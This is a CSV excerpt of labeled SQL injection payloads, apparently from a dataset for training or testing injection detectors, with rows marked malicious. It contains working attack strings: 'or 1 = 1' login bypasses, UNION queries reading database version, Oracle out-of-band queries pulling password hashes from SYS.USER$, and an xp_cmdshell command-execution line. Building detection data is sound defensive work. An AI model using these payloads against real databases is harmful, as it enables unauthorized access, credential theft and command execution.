row_index,payload_norm,label,sqli_type_hint
240,"select * from users where id = 1 or 1#""? union select version ( ) ,version ( ) -- 1",1,
241,"select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",1,
242,or uid like '%,1,
243,select * from users where id = '1' <@&1 or 1 = 1 -- 1',1,
244,"select * from users where id = '1' union select !<1,version ( ) -- 1'",1,
245,23 or 1 = 1; --,1,
246,"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1,
247,"select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",1,
248,"select * from users where id = 1 or ""%_"" or 1 = 1 -- 1",1,
249,select * from users where id = 1 + ( \. ) or 1 = 1 -- 1,1,
250,"select * from users where id = '1' union select \,@@VERSION -- 1'",1,
251,0 or 1 = 1,1,
252,select * from users where id = 1 &@ or 1 = 1 -- 1,1,
253,"admin"" ) or ""1"" = ""1",1,
254,select * from users where id = 1 or \< = 1 or 1 = 1 -- 1,1,
255,"select * from users where id = 1 or ""??"" or 1 = 1 -- 1",1,
256,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",1,
257,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1,
258,' OR,1,
259,sqlvuln;,1,
260,select * from users where id = 1 + $+%$ or 1 = 1 -- 1,1,
261,select * from users where id = '1' + $+%\ or 1 = 1 -- 1',1,
262,""" or """"*""",1,
263,"hi or 1 = 1 --""",1,
264,"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1,
265,; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,
266,"select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1,
267,"select * from users where id = '1' union select ""?""_,version ( ) -- 1'",1,
268,select * from users where id = 1 or \<\. or 1 = 1 -- 1,1,
269,( select top 1,1,
